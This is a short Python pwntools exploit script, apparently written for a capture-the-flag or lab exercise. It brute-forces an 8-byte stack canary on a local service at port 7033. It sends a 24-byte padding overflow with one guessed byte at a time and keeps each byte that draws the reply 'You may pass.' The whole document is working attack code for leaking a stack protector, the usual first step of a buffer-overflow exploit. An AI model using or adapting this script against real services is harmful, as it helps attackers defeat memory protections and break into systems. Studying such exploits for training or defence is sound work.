from pwn import *

# Set the target host and port
target_host = '127.0.0.1'
target_port = 7033

COOKIE_LENGTH = 8
cookie = b'' 

#guess cookie here
for each_byte in range(COOKIE_LENGTH):
    for each_value in range(256):
   
        # Connect to the target
        p = remote(target_host, target_port)

        # Receive and print the initial message from the server
        initial_message = p.recvline()
        print(f"[*] Received initial message: {initial_message.decode()}")
        
        #guess cookie here

        byte_guess = p8(each_value)

        # Send payload when prompted for name
        payload = b"A"*24 + byte_guess + cookie
        print(f"[*] sending payload: {payload}")
        p.sendline(payload)       # Send the payload

        #
        #FOR DEBUGGING, REMOVE WHEN DONE
        #  
        '''
        timeout_input = 0
        try:
            timeout_input = input("[*] Enter timeout for response: ")
            timeout_input = int(timeout_input)
        except KeyboardInterrupt:
            pass  # Handle Ctrl+C gracefully.
        '''
        #
        #END DEBUGGING
        #
        timeout_input = 1
        try:
            response = p.recvline(timeout=timeout_input)

            # If guess is correct, add to the cookie
            if response == b"You may pass.\n":
                print(f"[*] Received response: {response.decode()}")
                cookie = byte_guess + cookie
                print(f"Byte {each_byte} Found: {byte_guess}")
                print(f"Cookie: {cookie}")
                break

        except EOFError:
            # Move to the next byte
            continue
            
# Close the connection
p.close()